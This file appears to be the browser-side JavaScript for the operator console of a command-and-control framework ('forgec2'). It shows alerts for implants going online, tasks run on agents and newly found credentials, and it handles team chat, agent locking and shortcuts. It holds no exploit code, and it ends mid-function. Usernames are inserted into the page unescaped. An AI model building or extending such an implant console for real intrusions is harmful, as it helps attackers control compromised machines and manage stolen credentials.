function showToast(message, type = 'success', duration = 3000) {
    const container = document.getElementById('toast-container');
    if (!container) {
        console.warn('[toast]', message);
        return;
    }
    const toast = document.createElement('div');
    const colorMap = {
        'success': 'bg-emerald-100 dark:bg-emerald-900/30 border-emerald-300 dark:border-emerald-800 text-emerald-700 dark:text-emerald-400',
        'error': 'bg-red-100 dark:bg-red-900/30 border-red-300 dark:border-red-800 text-red-700 dark:text-red-400',
        'warning': 'bg-amber-100 dark:bg-amber-900/30 border-amber-300 dark:border-amber-800 text-amber-700 dark:text-amber-400',
        'info': 'bg-sky-100 dark:bg-sky-900/30 border-sky-300 dark:border-sky-800 text-sky-700 dark:text-sky-400',
    };
    const iconMap = {
        'success': 'fa-check-circle',
        'error': 'fa-exclamation-circle',
        'warning': 'fa-triangle-exclamation',
        'info': 'fa-circle-info',
    };
    toast.className = `px-4 py-3 rounded-2xl shadow-xl flex items-center gap-x-3 text-sm border toast-enter cursor-pointer hover:shadow-2xl transition-shadow ${colorMap[type] || colorMap.success}`;
    toast.innerHTML = `<i class="fa-solid ${iconMap[type] || iconMap.success} flex-shrink-0"></i>`;
    const msgSpan = document.createElement('span');
    msgSpan.textContent = message;
    msgSpan.className = 'flex-1';
    toast.appendChild(msgSpan);
    
    const closeBtn = document.createElement('button');
    closeBtn.className = 'ml-2 p-1 rounded-lg hover:bg-black/5 dark:hover:bg-white/5 transition-colors flex-shrink-0';
    closeBtn.innerHTML = '<i class="fa-solid fa-xmark text-xs opacity-60"></i>';
    closeBtn.onclick = function(e) {
        e.stopPropagation();
        closeToast(toast);
    };
    toast.appendChild(closeBtn);
    
    toast.onclick = function() {
        closeToast(toast);
    };
    
    container.appendChild(toast);
    
    const timer = setTimeout(() => {
        closeToast(toast);
    }, duration);
    
    toast._timer = timer;
}

function closeToast(toast) {
    if (toast._timer) {
        clearTimeout(toast._timer);
        toast._timer = null;
    }
    toast.classList.remove('toast-enter');
    toast.classList.add('toast-exit');
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(10px)';
    setTimeout(() => {
        if (toast.parentNode) {
            toast.parentNode.removeChild(toast);
        }
    }, 300);
}

function showGlobalLoading() {
    const loader = document.getElementById('global-loading');
    if (loader) {
        loader.classList.remove('hidden');
    }
}

function hideGlobalLoading() {
    const loader = document.getElementById('global-loading');
    if (loader) {
        loader.classList.add('hidden');
    }
}

// Track known online users to avoid spamming toasts on page changes
let knownOnlineUsers = new Set();

function collabT(key) {
    return typeof __ === 'function' ? __(key) : key;
}

function ensureSelfInUsers(users) {
    users = Array.isArray(users) ? users : [];
    const currentUser = window.currentUserDisplayName || '';
    const currentRole = window.currentUserRole || 'operator';
    if (!currentUser) return users;
    if (users.some(u => u.username === currentUser)) return users;
    return users.concat([{
        username: currentUser,
        role: currentRole,
        current_page: window.location.pathname || ''
    }]);
}

function fetchOnlineUsers() {
    const container = document.getElementById('online-users');
    if (!container) return Promise.resolve();

    return fetch('/api/collab/online', { credentials: 'same-origin' })
        .then(r => r.json())
        .then(d => {
            if (d.success) {
                updateOnlineUsers(Array.isArray(d.users) ? d.users : []);
            } else {
                showOnlineUsersError();
            }
        })
        .catch(() => showOnlineUsersError());
}

function showOnlineUsersError() {
    const container = document.getElementById('online-users');
    if (!container) return;
    container.innerHTML = '<div class="text-[11px] text-slate-400 dark:text-slate-500 italic">' +
        collabT('collab.load_failed') + '</div>';
}

function updateOnlineUsers(users) {
    users = ensureSelfInUsers(users);
    const container = document.getElementById('online-users');
    const count = document.getElementById('online-count');
    if (!container) return;
    if (count) count.textContent = users.length;
    if (users.length === 0) {
        container.innerHTML = '<div class="text-[11px] text-slate-400 dark:text-slate-500 italic">' +
            collabT('collab.no_online_users') + '</div>';
        return;
    }
    const currentUser = window.currentUserDisplayName || '';
    container.innerHTML = users.map(u => {
        const isMe = u.username === currentUser;
        const roleIcon = u.role === 'admin' ? 'fa-crown text-amber-500' :
                       u.role === 'viewer' ? 'fa-eye text-slate-400 dark:text-slate-500' :
                       'fa-user text-sky-500';
        const badge = u.role === 'admin' ? '<span class="text-[8px] bg-indigo-100 dark:bg-indigo-900/40 text-indigo-700 dark:text-indigo-400 px-1 rounded">ADMIN</span>' :
                     u.role === 'viewer' ? '<span class="text-[8px] bg-slate-100 dark:bg-slate-600 text-slate-500 dark:text-slate-400 px-1 rounded">VIEW</span>' :
                     '<span class="text-[8px] bg-sky-100 dark:bg-sky-900/40 text-sky-600 dark:text-sky-400 px-1 rounded">OP</span>';
        const nameClass = isMe ? 'text-indigo-600 font-semibold' : 'text-slate-700 dark:text-slate-300';
        const selfLabel = isMe ? '<span class="text-[8px] text-indigo-400 dark:text-indigo-500 ml-0.5">(' + collabT('collab.you') + ')</span>' : '';
        const pageInfo = u.current_page && !isMe
            ? `<span class="text-[9px] text-slate-400 dark:text-slate-500 block truncate pl-4">${escapeHtml(u.current_page)}</span>`
            : '';
        return `<div class="flex items-center gap-x-1.5 text-[11px]"><span class="w-1.5 h-1.5 bg-emerald-500 rounded-full shrink-0"></span><i class="fa-solid ${roleIcon} text-[10px] w-3 text-center shrink-0"></i><span class="${nameClass} truncate max-w-[80px]">${u.username}${selfLabel}</span>${badge}${pageInfo}</div>`;
    }).join('');

    // Detect newly online users for toast
    if (knownOnlineUsers.size > 0) {
        const newNames = users.map(u => u.username);
        newNames.forEach(name => {
            if (!knownOnlineUsers.has(name) && name !== currentUser) {
                showToast(name + ' 上线', 'info');
            }
        });
    }
    knownOnlineUsers = new Set(users.map(u => u.username));
}

function toggleChat() {
    const w = document.getElementById('chat-window');
    w.classList.toggle('hidden');
    if (!w.classList.contains('hidden')) {
        document.getElementById('chat-badge').classList.add('hidden');
        if (document.getElementById('chat-messages').children.length <= 1) {
            loadChatHistory();
        }
    }
}

function loadChatHistory() {
    fetch('/api/collab/chat').then(r => r.json()).then(d => {
        if (d.success && d.messages) {
            const el = document.getElementById('chat-messages');
            el.innerHTML = '';
            d.messages.forEach(m => appendChatMessage(m, m.role || ''));
            el.scrollTop = el.scrollHeight;
        }
    }).catch(() => showToast('聊天消息加载失败', 'error'));
}

function appendChatMessage(msg, role) {
    const el = document.getElementById('chat-messages');
    if (!el) return;
    const chatWin = document.getElementById('chat-window');
    if (chatWin && chatWin.classList.contains('hidden') && msg.username !== '[系统]' && msg.username !== window.currentUserDisplayName) {
        const badge = document.getElementById('chat-badge');
        if (badge) badge.classList.remove('hidden');
    }
    if (el.children.length === 1 && el.children[0].textContent.includes('连接')) {
        el.innerHTML = '';
    }
    const time = msg.created_at ? new Date(msg.created_at).toLocaleTimeString() : '';
    const div = document.createElement('div');
    const isSystem = msg.username === '[系统]';
    if (isSystem) {
        div.className = 'bg-slate-100 dark:bg-slate-800 rounded-xl px-3 py-2 border border-slate-200 dark:border-slate-700';
        div.innerHTML = `<div class="flex items-center gap-2 text-[10px] text-slate-500 dark:text-slate-400"><i class="fa-solid fa-circle-info text-slate-400 dark:text-slate-500"></i><span>${escapeHtml(msg.content)}</span><span class="ml-auto text-[9px] text-slate-400 dark:text-slate-500">${time}</span></div>`;
    } else {
        const roleColor = role === 'admin' ? 'text-amber-600' : role === 'viewer' ? 'text-slate-500 dark:text-slate-400' : 'text-indigo-600';
        div.className = 'bg-white dark:bg-slate-700 rounded-xl px-3 py-2 border border-slate-100 dark:border-slate-600';
        div.innerHTML = `<div class="flex items-center justify-between"><span class="text-xs font-semibold ${roleColor}">${escapeHtml(msg.username)}</span><span class="text-[9px] text-slate-400 dark:text-slate-500">${time}</span></div><div class="text-xs text-slate-700 dark:text-slate-300 mt-0.5">${escapeHtml(msg.content)}</div>`;
    }
    el.appendChild(div);
    el.scrollTop = el.scrollHeight;
}

function sendChat(e) {
    e.preventDefault();
    const input = document.getElementById('chat-input');
    const content = input.value.trim();
    if (!content) return;
    input.value = '';
    const fd = new FormData();
    fd.append('content', content);
    fetch('/api/collab/chat', { method: 'POST', body: fd }).catch(() => showToast('聊天发送失败', 'error'));
}

function updateAgentLockUI(agentId, username) {
    const indicator = document.getElementById('lock-indicator-' + agentId);
    if (!indicator) return;
    if (username) {
        indicator.innerHTML = `<span class="text-xs text-amber-600"><i class="fa-solid fa-lock mr-1"></i>${username}</span>`;
    } else {
        indicator.innerHTML = '';
    }
}

function escapeHtml(str) {
    if (!str) return '';
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}
window.escapeHtml = escapeHtml;

var _ws = null;
var _knownAgentStatus = {};
var _agentPollReady = false;
var _lastAgentNotifyAt = {};

function shouldNotifyAgent(agentId, cooldownMs) {
    const now = Date.now();
    const last = _lastAgentNotifyAt[agentId] || 0;
    if (now - last < (cooldownMs || 10000)) return false;
    _lastAgentNotifyAt[agentId] = now;
    return true;
}

function notifyAgentOnline(agent, isNew) {
    const agentId = agent.agent_id || agent.id;
    if (!agentId || !shouldNotifyAgent(agentId, 10000)) return;

    const isNewAgent = isNew === true || isNew === 'true';
    const title = isNewAgent ? '新 Implant 上线' : 'Implant 重新上线';
    const msg = `${agent.hostname || agentId} (${agent.ip || '—'})`;
    showToast(`${title}: ${msg}`, 'success', 5000);
    if (window.NotificationCenter && window.NotificationSources) {
        NotificationCenter.addNotification(
            window.NotificationSources.AGENT_ONLINE,
            title,
            msg,
            { agent_id: agentId, hostname: agent.hostname, ip: agent.ip, new: isNewAgent }
        );
    }
    _knownAgentStatus[agentId] = 'online';
    if (window.location.pathname === '/agents' || window.location.pathname === '/dashboard') {
        setTimeout(() => window.location.reload(), 1000);
    }
}

function notifyAgentOffline(agent) {
    const agentId = agent.agent_id || agent.id;
    if (!agentId || !shouldNotifyAgent(agentId, 10000)) return;

    const offlineMsg = agent.hostname || agentId;
    showToast(`Implant 离线: ${offlineMsg}`, 'warning', 5000);
    if (window.NotificationCenter && window.NotificationSources) {
        NotificationCenter.addNotification(
            window.NotificationSources.AGENT_OFFLINE,
            'Implant 离线',
            offlineMsg,
            { agent_id: agentId, hostname: agent.hostname }
        );
    }
    _knownAgentStatus[agentId] = agent.status || 'offline';
}

function pollAgentStatus() {
    fetch('/api/agents', { credentials: 'same-origin' })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (!data || !Array.isArray(data.agents)) return;
            const agents = data.agents;

            if (!_agentPollReady) {
                agents.forEach(function(a) { _knownAgentStatus[a.id] = a.status; });
                _agentPollReady = true;
                return;
            }

            const seen = {};
            agents.forEach(function(a) {
                seen[a.id] = true;
                const prev = _knownAgentStatus[a.id];
                if (a.status === 'online' && prev && prev !== 'online') {
                    notifyAgentOnline(a, false);
                } else if (a.status === 'online' && !prev) {
                    notifyAgentOnline(a, true);
                } else if (prev === 'online' && a.status !== 'online') {
                    notifyAgentOffline(a);
                }
                _knownAgentStatus[a.id] = a.status;
            });

            Object.keys(_knownAgentStatus).forEach(function(id) {
                if (!seen[id]) delete _knownAgentStatus[id];
            });
        })
        .catch(function() {});
}

function isAIPagePath() {
    return window.location.pathname === '/ai' || !!document.getElementById('ai-page');
}

function stopAgentStatusPolling() {
    if (window._agentStatusPoll) {
        clearInterval(window._agentStatusPoll);
        window._agentStatusPoll = null;
    }
}

function startAgentStatusPolling() {
    if (isAIPagePath()) return;
    if (window._agentStatusPoll) return;
    pollAgentStatus();
    window._agentStatusPoll = setInterval(pollAgentStatus, 5000);
}

function wsSend(data) {
    if (_ws && _ws.readyState === WebSocket.OPEN) {
        _ws.send(JSON.stringify(data));
    }
}

function sendWSPageUpdate() {
    const path = window.location.pathname;
    wsSend({ type: 'page_update', page: path });
    const m = path.match(/^\/agents\/([a-fA-F0-9-]+)/);
    if (m) {
        wsSend({ type: 'agent_view', agent_id: m[1] });
    }
}

let _wsReconnectAttempts = 0;
const MAX_WS_RECONNECT_ATTEMPTS = 20;
let _wsPingInterval = null;

function startWSPing() {
    stopWSPing();
    _wsPingInterval = setInterval(function() {
        wsSend({ type: 'ping' });
    }, 25000);
}

function stopWSPing() {
    if (_wsPingInterval) {
        clearInterval(_wsPingInterval);
        _wsPingInterval = null;
    }
}

function connectWebSocket() {
    if (_ws && (_ws.readyState === WebSocket.OPEN || _ws.readyState === WebSocket.CONNECTING)) {
        return;
    }

    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    _ws = new WebSocket(protocol + '//' + window.location.host + '/ws');

    _ws.onopen = function() {
        _wsReconnectAttempts = 0;
        stopAgentStatusPolling();
        startWSPing();
        sendWSPageUpdate();
        fetchOnlineUsers();
    };

    _ws.onmessage = function(event) {
        try {
            const data = JSON.parse(event.data);
            if (data.type === 'agent_online') {
                notifyAgentOnline(data, data.new);
            } else if (data.type === 'agent_offline') {
                notifyAgentOffline(data);
            } else if (data.type === 'task_update') {
                const agentId = data.agent_id || '';
                const taskType = data.task_type || '';
                const status = data.status || '';
                const cmd = (data.command || '').substring(0, 50);

                if (taskType === 'ls') return;

                if (status === 'completed') {
                    showToast(`任务完成 [${taskType}]: ${cmd}`, 'success');
                    if (window.NotificationCenter) {
                        NotificationCenter.addNotification(
                            NotificationSources.TASK_COMPLETE,
                            '任务完成',
                            `[${taskType}] ${cmd}`,
                            { agent_id: agentId, task_type: taskType, command: data.command }
                        );
                    }
                    const path = window.location.pathname;
                    if (path === '/tasks' || path.includes('/agents/' + agentId)) {
                        setTimeout(() => {
                            if (path === '/tasks') {
                                location.reload();
                            } else if (typeof refreshTasks === 'function') {
                                refreshTasks(agentId);
                            } else if (typeof checkPendingTasks === 'function') {
                                checkPendingTasks();
                            }
                        }, 800);
                    }
                } else if (status === 'failed') {
                    showToast(`任务失败 [${taskType}]: ${cmd}`, 'error');
                    if (window.NotificationCenter) {
                        NotificationCenter.addNotification(
                            NotificationSources.TASK_FAIL,
                            '任务失败',
                            `[${taskType}] ${cmd}`,
                            { agent_id: agentId, task_type: taskType, command: data.command }
                        );
                    }
                }
            } else if (data.type === 'credential_found') {
                showToast('发现新凭据', 'success');
                if (window.NotificationCenter) {
                    NotificationCenter.addNotification(
                        NotificationSources.CREDENTIAL_FOUND,
                        '发现新凭据',
                        data.description || '发现新的凭据信息',
                        { credential_id: data.credential_id, type: data.cred_type }
                    );
                }
            } else if (data.type === 'system_alert') {
                showToast(data.message || '系统告警', 'warning');
                if (window.NotificationCenter) {
                    NotificationCenter.addNotification(
                        NotificationSources.SYSTEM_ALERT,
                        data.title || '系统告警',
                        data.message || '',
                        { alert_type: data.alert_type }
                    );
                }
            } else if (data.type === 'update_available') {
                showToast(`新版本可用: ${data.latest} (当前: ${data.current})`, 'info');
                const banner = document.getElementById('update-banner');
                if (banner) {
                    banner.classList.remove('hidden');
                    banner.querySelector('.update-version').textContent = data.latest;
                    banner.querySelector('.update-download').href = data.download_url || '#';
                }
            } else if (data.type === 'user_online' || data.type === 'user_offline') {
                updateOnlineUsers(data.users);
                if (window.NotificationCenter) {
                    const username = data.username || '未知用户';
                    if (data.type === 'user_online') {
                        NotificationCenter.addNotification(
                            NotificationSources.USER_ONLINE,
                            '用户上线',
                            `${username} 已上线`,
                            { username: username, user_id: data.user_id }
                        );
                    } else if (data.type === 'user_offline') {
                        NotificationCenter.addNotification(
                            NotificationSources.USER_OFFLINE,
                            '用户下线',
                            `${username} 已下线`,
                            { username: username, user_id: data.user_id }
                        );
                    }
                }
                if (data.type === 'user_offline' && data.username && data.username !== window.currentUserDisplayName) {
                    showToast(data.username + ' 下线', 'warning');
                }
            } else if (data.type === 'chat') {
                appendChatMessage(data.message, data.message.role);
            } else if (data.type === 'agent_locked') {
                showToast(`Implant ${data.agent_id.substring(0,8)} 已被 ${data.username} 锁定`, 'info');
                updateAgentLockUI(data.agent_id, data.username);
                const lockEl = document.querySelector('#lock-col-' + data.agent_id + ' .lock-text');
                if (lockEl) lockEl.textContent = '🔒 ' + data.username;
            } else if (data.type === 'agent_unlocked') {
                showToast(`Implant ${data.agent_id.substring(0,8)} 已解锁`, 'info');
                updateAgentLockUI(data.agent_id, null);
                const lockEl = document.querySelector('#lock-col-' + data.agent_id + ' .lock-text');
                if (lockEl) lockEl.textContent = '';
            } else if (data.type === 'user_viewing_agent') {
                window.dispatchEvent(new CustomEvent('collab:viewing_agent', { detail: data }));
            } else if (data.type === 'pong') {
                // heartbeat ack
            }
        } catch (e) {
            console.warn('Failed to parse WebSocket message:', e);
        }
    };

    _ws.onerror = function(error) {
        _wsReconnectAttempts++;
        if (_wsReconnectAttempts <= MAX_WS_RECONNECT_ATTEMPTS) {
            console.warn('WebSocket reconnect attempt ' + _wsReconnectAttempts + '/' + MAX_WS_RECONNECT_ATTEMPTS);
        }
    };

    _ws.onclose = function(event) {
        stopWSPing();
        _ws = null;
        if (event.code !== 1000 && event.code !== 1001) {
            _wsReconnectAttempts++;
            if (_wsReconnectAttempts <= MAX_WS_RECONNECT_ATTEMPTS) {
                const delay = Math.min(5000 * _wsReconnectAttempts, 30000);
                setTimeout(connectWebSocket, delay);
            } else {
                startAgentStatusPolling();
            }
        }
    };
}

function initOnlineUsersPanel() {
    fetchOnlineUsers();
    if (!window._onlineUsersPoll) {
        window._onlineUsersPoll = setInterval(fetchOnlineUsers, 30000);
    }
}
window.fetchOnlineUsers = fetchOnlineUsers;
window.updateOnlineUsers = updateOnlineUsers;

function initRealtimeNotifications() {
    try { connectWebSocket(); } catch (e) { console.warn('WebSocket init failed:', e); }
    startAgentStatusPolling();
    initOnlineUsersPanel();
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initRealtimeNotifications);
} else {
    initRealtimeNotifications();
}

function closeTopBarMenus(exceptId) {
    if (typeof window.closeTopBarMenus === 'function') {
        window.closeTopBarMenus(exceptId);
        return;
    }
    ['theme-menu', 'language-menu'].forEach(function(id) {
        if (id === exceptId) return;
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

window.GlobalActionHandlers = window.GlobalActionHandlers || {};
window.GlobalActionHandlers.set_theme = function(el, e) {
    e.preventDefault();
    e.stopPropagation();
    const theme = el.dataset.theme;
    if (typeof window.handleThemeSelect === 'function' && theme) {
        window.handleThemeSelect(theme);
    } else if (typeof window.setTheme === 'function' && theme) {
        window.setTheme(theme);
        closeTopBarMenus();
    }
};
window.GlobalActionHandlers.set_language = function(el, e) {
    e.preventDefault();
    e.stopPropagation();
    const lang = el.dataset.lang;
    if (typeof window.handleLanguageSelect === 'function' && lang) {
        window.handleLanguageSelect(lang);
    } else if (typeof window.setLanguage === 'function' && lang) {
        window.setLanguage(lang);
        closeTopBarMenus();
    }
};

document.addEventListener('htmx:afterSettle', function() {
    sendWSPageUpdate();
});

window.addEventListener('popstate', function() {
    setTimeout(sendWSPageUpdate, 100);
});



window.toggleNavSection = function(headerEl) {
    headerEl.classList.toggle('collapsed');
    const section = headerEl.nextElementSibling;
    const key = 'forgec2_nav_collapsed';
    let collapsed = JSON.parse(localStorage.getItem(key) || '{}');
    const label = headerEl.textContent.trim();
    collapsed[label] = headerEl.classList.contains('collapsed');
    localStorage.setItem(key, JSON.stringify(collapsed));
};

(function restoreNavState() {
    try {
        const key = 'forgec2_nav_collapsed';
        const collapsed = JSON.parse(localStorage.getItem(key) || '{}');
        document.addEventListener('DOMContentLoaded', function() {
            const headers = document.querySelectorAll('#sidebar-nav .section-header');
            headers.forEach(h => {
                const label = h.textContent.trim();
                if (collapsed[label]) {
                    h.classList.add('collapsed');
                }
            });
        });
    } catch(e){}
})();

window.filterNav = function(query) {
    const q = (query || '').toLowerCase().trim();
    const nav = document.getElementById('sidebar-nav');
    if (!nav) return;

    const links = nav.querySelectorAll('a');
    const sections = nav.querySelectorAll('.section-header');

    links.forEach(link => {
        const text = link.textContent.toLowerCase();
        const match = !q || text.includes(q);
        link.style.display = match ? '' : 'none';
        
        if (match && q) {
            link.classList.add('nav-highlight');
            const span = link.querySelector('span');
            if (span) {
                const originalText = span.textContent;
                const index = originalText.toLowerCase().indexOf(q);
                if (index !== -1) {
                    const before = originalText.substring(0, index);
                    const matchText = originalText.substring(index, index + q.length);
                    const after = originalText.substring(index + q.length);
                    span.innerHTML = `${before}<mark class="bg-indigo-200 dark:bg-indigo-800 text-indigo-900 dark:text-indigo-300 rounded px-0.5">${matchText}</mark>${after}`;
                }
            }
        } else {
            link.classList.remove('nav-highlight');
            const span = link.querySelector('span');
            if (span) {
                span.innerHTML = span.textContent;
            }
        }
    });

    sections.forEach(header => {
        const next = header.nextElementSibling;
        if (!next || !next.classList.contains('nav-section')) return;
        const visible = Array.from(next.querySelectorAll('a')).some(a => a.style.display !== 'none');
        header.style.display = (visible || !q) ? '' : 'none';
        next.style.display = (visible || !q) ? '' : 'none';
        
        if (visible && q) {
            header.classList.remove('collapsed');
        }
    });
};

window.showCreateListenerModal = function() {
    if (typeof showCreateModal === 'function') {
        showCreateModal();
        return;
    }
    window.location.href = '/listeners?create=1';
};

var _modalAgentId = '';
var _modalTaskId = 0;

function toggleMobileSidebar() {
    const sidebar = document.getElementById('mobile-sidebar');
    const overlay = document.getElementById('mobile-overlay');
    sidebar.classList.toggle('open');
    overlay.classList.toggle('active');

    const mobileNav = document.getElementById('mobile-sidebar-nav');
    if (mobileNav.children.length === 0) {
        const desktopNav = document.getElementById('sidebar-nav');
        if (desktopNav) {
            mobileNav.innerHTML = desktopNav.innerHTML;
        }
    }
}

document.addEventListener('click', function(e) {
    if (e.target.closest('#mobile-sidebar-nav a')) {
        toggleMobileSidebar();
    }
});

function showRecentTaskModal(el) {
    const taskId = el.getAttribute('data-task-id');
    const agentId = el.getAttribute('data-agent-id');
    if (!taskId) return;
    _modalTaskId = taskId;
    _modalAgentId = agentId || '';

    const resultBox = document.getElementById('modal-result-box');
    const errorBox = document.getElementById('modal-error-box');
    resultBox.classList.add('hidden');
    errorBox.classList.add('hidden');

    const hostnameEl = el.querySelector('.font-medium.text-slate-900');
    document.getElementById('modal-agent').textContent = hostnameEl ? hostnameEl.textContent : '-';
    const cmdEl = el.querySelector('.font-mono.truncate');
    document.getElementById('modal-command').textContent = cmdEl ? cmdEl.textContent : '-';
    const timeEl = el.querySelector('.font-mono.text-slate-400');
    document.getElementById('modal-time').textContent = timeEl ? timeEl.textContent : '';

    document.getElementById('task-modal').classList.remove('hidden');
    document.getElementById('task-modal').classList.add('flex');

    fetch(`/tasks/${taskId}`)
        .then(r => r.json())
        .then(data => {
            if (data.error) {
                document.getElementById('modal-command').textContent = '(详情加载失败)';
                return;
            }
            document.getElementById('modal-type').textContent = data.type || '-';
            document.getElementById('modal-agent').textContent = data.agent || document.getElementById('modal-agent').textContent;
            document.getElementById('modal-time').textContent = data.created || document.getElementById('modal-time').textContent;
            document.getElementById('modal-command').textContent = data.command || '-';

            if (data.result) {
                document.getElementById('modal-result').textContent = data.result;
                resultBox.classList.remove('hidden');
            }
            if (data.error) {
                document.getElementById('modal-error').textContent = data.error;
                errorBox.classList.remove('hidden');
            }
            document.getElementById('modal-status').innerHTML = data.status === 'completed' ?
                '<span class="px-2 py-0.5 bg-emerald-100 text-emerald-700 rounded text-xs">已完成</span>' :
                (data.status === 'failed' ? '<span class="px-2 py-0.5 bg-red-100 text-red-700 rounded text-xs">失败</span>' : '<span class="px-2 py-0.5 bg-amber-100 text-amber-700 rounded text-xs">' + (data.status || '') + '</span>');
        })
        .catch(err => {
            console.error('fetch task detail error', err);
        });
}

function hideTaskModal() {
    const modal = document.getElementById('task-modal');
    modal.classList.remove('flex');
    modal.classList.add('hidden');
}

function rerunFromModal() {
    if (!_modalAgentId || !_modalTaskId) return;
    fetch(`/agents/${_modalAgentId}/task/${_modalTaskId}/rerun`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                showToast('任务已重新创建', 'success');
                hideTaskModal();
                setTimeout(() => location.reload(), 1200);
            } else {
                showToast('重跑失败: ' + (data.error || ''), 'error');
            }
        })
        .catch(err => showToast('请求失败: ' + err, 'error'));
}

// ==================== 全局搜索 ====================

function runSearch(query) {
    const q = (query || '').trim();
    window.location.href = q ? '/search?q=' + encodeURIComponent(q) : '/search';
}

function focusGlobalSearch() {
    const input = document.getElementById('global-search-input');
    if (input) {
        input.focus();
        input.select();
        return;
    }
    const pageInput = document.getElementById('search-page-input');
    if (pageInput) {
        pageInput.focus();
        pageInput.select();
        return;
    }
    window.location.href = '/search';
}

window.runSearch = runSearch;
window.focusGlobalSearch = focusGlobalSearch;

// ==================== 快捷键系统 ====================

let _currentShortcuts = null;

function initShortcuts() {
    _currentShortcuts = Shortcuts.load();
    document.addEventListener('keydown', handleKeydown);
}

function handleKeydown(event) {
    if (!_currentShortcuts) return;
    
    const target = event.target;
    const isInput = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable;

    if (Shortcuts.match(event, _currentShortcuts.global_search)) {
        event.preventDefault();
        if (typeof focusGlobalSearch === 'function') {
            focusGlobalSearch();
        } else {
            window.location.href = '/search';
        }
        return;
    }
    
    if (Shortcuts.match(event, _currentShortcuts.close_modal)) {
        closeModals();
        event.preventDefault();
        return;
    }
    
    if (isInput) {
        if (Shortcuts.match(event, _currentShortcuts.save)) {
            event.preventDefault();
            triggerSave();
        }
        return;
    }
    
    if (Shortcuts.match(event, _currentShortcuts.new_item)) {
        event.preventDefault();
        triggerNew();
    } else if (Shortcuts.match(event, _currentShortcuts.save)) {
        event.preventDefault();
        triggerSave();
    } else if (Shortcuts.match(event, _currentShortcuts.show_shortcuts)) {
        event.preventDefault();
        toggleShortcutsHelp();
    } else if (Shortcuts.match(event, _currentShortcuts.refresh)) {
        event.preventDefault();
        window.location.reload();
    } else if (Shortcuts.match(event, _currentShortcuts.toggle_lock)) {
        event.preventDefault();
        toggleAgentLock();
    }
}

function triggerNew() {
    const path = window.location.pathname;
    
    if (path === '/listeners') {
        showCreateListenerModal();
    } else if (path === '/generate') {
        const generateBtn = document.querySelector('button[type="submit"]');
        if (generateBtn) generateBtn.click();
    } else if (path.startsWith('/agents/')) {
        const commandInput = document.querySelector('input[name="command"], textarea[name="command"]');
        if (commandInput) {
            commandInput.focus();
        } else {
            showToast('在当前页面没有可新建的操作', 'info');
        }
    } else if (path === '/credentials') {
        const addBtn = document.querySelector('button[onclick*="addCredential"], button[hx-post*="credential"]');
        if (addBtn) addBtn.click();
    } else if (path === '/tokens') {
        const addBtn = document.querySelector('button[onclick*="addToken"], button[hx-post*="token"]');
        if (addBtn) addBtn.click();
    } else {
        showToast('在当前页面没有可新建的操作', 'info');
    }
}

function triggerSave() {
    const activeSection = document.querySelector('.settings-nav.bg-indigo-50');
    if (activeSection) {
        const sectionId = activeSection.getAttribute('data-section');
        const form = document.querySelector('#section-' + sectionId + ' form');
        if (form) {
            form.querySelector('button[type="submit"]')?.click();
            return;
        }
    }
    
    const forms = document.querySelectorAll('form');
    for (const form of forms) {
        const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
        if (submitBtn && !submitBtn.disabled) {
            submitBtn.click();
            return;
        }
    }
    
    showToast('没有找到可保存的表单', 'info');
}

function closeModals() {
    hideTaskModal();
    
    const modals = document.querySelectorAll('.fixed.inset-0.bg-black.bg-opacity-50, .modal, .dropdown-menu');
    modals.forEach(modal => {
        if (modal.classList.contains('hidden')) return;
        const closeBtn = modal.querySelector('button[onclick*="hide"], button[onclick*="close"], button[onclick*="toggle"]');
        if (closeBtn) {
            closeBtn.click();
        } else {
            modal.classList.add('hidden');
        }
    });
    
    const dropdowns = document.querySelectorAll('[class*="dropdown"].open, .dropdown-menu.open');
    dropdowns.forEach(d => d.classList.remove('open'));
}

function toggleAgentLock() {
    const path = window.location.pathname;
    const match = path.match(/^\/agents\/([a-fA-F0-9-]+)/);
    
    if (!match) {
        showToast('请先选择一个 Agent', 'info');
        return;
    }
    
    const agentId = match[1];
    const lockBtn = document.querySelector(`button[onclick*="lockAgent('${agentId}')"], button[onclick*="unlockAgent('${agentId}')"]`);
    
    if (lockBtn) {
        lockBtn.click();
    } else {
        const lockIndicator = document.getElementById('lock-indicator-' + agentId);
        if (lockIndicator && lockIndicator.textContent) {
            fetch(`/agents/${agentId}/unlock`, { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    if (data.success) {
                        showToast('Agent 已解锁', 'success');
                        setTimeout(() => location.reload(), 500);
                    } else {
                        showToast(data.error || '解锁失败', 'error');
                    }
                })
                .catch(() => showToast('请求失败', 'error'));
        } else {
            fetch(`/agents/${agentId}/lock`, { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    if (data.success) {
                        showToast('Agent 已锁定', 'success');
                        setTimeout(() => location.reload(), 500);
                    } else {
                        showToast(data.error || '锁定失败', 'error');
                    }
                })
                .catch(() => showToast('请求失败', 'error'));
        }
    }
}

function toggleShortcutsHelp() {
    const panel = document.getElementById('shortcuts-help-panel');
    if (!panel) return;
    
    if (panel.classList.contains('hidden')) {
        panel.classList.remove('hidden');
        panel.classList.add('flex');
        renderShortcutsList();
    } else {
        panel.classList.add('hidden');
        panel.classList.remove('flex');
    }
}

function renderShortcutsList() {
    const container = document.getElementById('shortcuts-list');
    if (!container || !_currentShortcuts) return;
    
    const isMac = navigator.platform.toUpperCase().indexOf('MAC') >= 0;
    
    const categories = [
        {
            name: '导航',
            items: ['global_search', 'refresh']
        },
        {
            name: '操作',
            items: ['new_item', 'save']
        },
        {
            name: 'Agent',
            items: ['toggle_lock']
        },
        {
            name: '界面',
            items: ['show_shortcuts', 'close_modal']
        }
    ];
    
    let html = '';
    categories.forEach(cat => {
        html += `<div class="mb-4"><div class="text-[10px] uppercase tracking-wider text-slate-400 font-semibold mb-2 px-1">${cat.name}</div><div class="space-y-1">`;
        cat.items.forEach(key => {
            const shortcut = _currentShortcuts[key];
            if (!shortcut) return;
            html += `
                <div class="flex items-center justify-between px-3 py-2 hover:bg-slate-50 rounded-lg transition-colors">
                    <span class="text-sm text-slate-700">${shortcut.description}</span>
